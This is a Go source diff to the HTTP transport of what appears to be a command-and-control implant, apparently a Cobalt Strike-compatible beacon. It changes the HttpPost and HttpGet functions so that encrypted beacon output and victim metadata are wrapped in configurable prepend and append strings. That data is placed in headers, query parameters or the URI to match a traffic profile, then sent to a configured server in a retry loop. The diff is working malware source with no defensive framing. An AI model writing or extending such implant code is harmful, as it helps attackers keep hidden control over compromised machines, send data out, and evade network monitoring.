@@ -3,6 +3,7 @@ package packet
 import (
 	"bytes"
 	"crypto/tls"
+	"errors"
 	"fmt"
 	"main/config"
 	"main/crypt"
@@ -33,12 +34,34 @@ func init() {
 	trans.TLSClientConfig = &tls.Config{InsecureSkipVerify: config.VerifySSLCert}
 }
 
-func HttpPost(url string, data []byte, cryptTypes []string) ([]byte, error) {
+func HttpPost(Url string, data []byte, cryptTypes []string, id []byte) ([]byte, error) {
+	var resp *req.Resp
+	var err error
+	var idHeader req.Header
+	data, _ = crypt.EncryptMultipleTypes(data, config.Http_post_client_output_crypt)
+	data = append([]byte(config.Http_post_client_output_prepend), data...)
+	data = append(data, []byte(config.Http_post_client_output_append)...)
+	id = append([]byte(config.Http_post_id_prepend), id...)
+	id = append(id, []byte(config.Http_post_id_append)...)
+	Url = Url + "?"
+	if config.Http_post_id_type == "header" {
+		idHeader = req.Header{config.Http_post_id_type_value: string(id)}
+	} else if config.Http_post_id_type == "parameter" {
+		Url = Url + config.Http_post_id_type_value + "=" + url.QueryEscape(string(id)) + "&"
+	} else {
+		return nil, errors.New("This type is not supported now for id")
+	}
 	for {
-		data, _ = crypt.EncryptMultipleTypes(data, config.Http_post_client_output_crypt)
-		data = append([]byte(config.Http_post_client_output_prepend), data...)
-		data = append(data, []byte(config.Http_post_client_output_append)...)
-		resp, err := httpRequest.Post(url, data, config.HttpHeaders)
+		if config.Http_post_client_output_type == "header" {
+			Data := req.Header{config.Http_post_client_output_type_value: string(data)}
+			resp, err = httpRequest.Post(Url, Data, config.HttpHeaders, idHeader)
+		} else if config.Http_post_client_output_type == "parameter" {
+			resp, err = httpRequest.Post(Url+config.Http_post_client_output_type_value+"="+url.QueryEscape(string(data)), config.HttpHeaders, idHeader)
+		} else if config.Http_post_client_output_type == "print" {
+			resp, err = httpRequest.Post(Url, data, config.HttpHeaders, idHeader)
+		} else {
+			return nil, errors.New("This type is not supported now for Post")
+		}
 		if err != nil {
 			//fmt.Printf("!error: %v\n",err)
 			fmt.Printf("connect error!")
@@ -56,10 +79,21 @@ func HttpPost(url string, data []byte, cryptTypes []string) ([]byte, error) {
 
 	return nil, nil
 }
-func HttpGet(url string, cookies string, cryptTypes []string) ([]byte, error) {
-	metaData := req.Header{config.Http_get_metadata_header: config.Http_get_metadata_prepend + cookies}
+func HttpGet(Url string, data string, cryptTypes []string) ([]byte, error) {
+	//metaData := req.Header{config.Http_get_metadata_header: config.Http_get_metadata_prepend + cookies}
+	var resp *req.Resp
+	var err error
 	for {
-		resp, err := httpRequest.Get(url, config.HttpHeaders, metaData)
+		if config.Http_get_metadata_type == "header" {
+			metaData := req.Header{config.Http_get_metadata_type_value: config.Http_get_metadata_prepend + data}
+			resp, err = httpRequest.Get(Url, config.HttpHeaders, metaData)
+		} else if config.Http_get_metadata_type == "parameter" {
+			resp, err = httpRequest.Get(Url+"?"+config.Http_get_metadata_type_value+"="+url.QueryEscape(data), config.HttpHeaders)
+		} else if config.Http_get_metadata_type == "uri-append" {
+			resp, err = httpRequest.Get(Url+url.QueryEscape(config.Http_get_metadata_prepend+data), config.HttpHeaders)
+		} else {
+			return nil, errors.New("This type is not supported now for metadata")
+		}
 		if err != nil {
 			fmt.Printf("!error: %v\n", err)
 			time.Sleep(config.WaitTime)
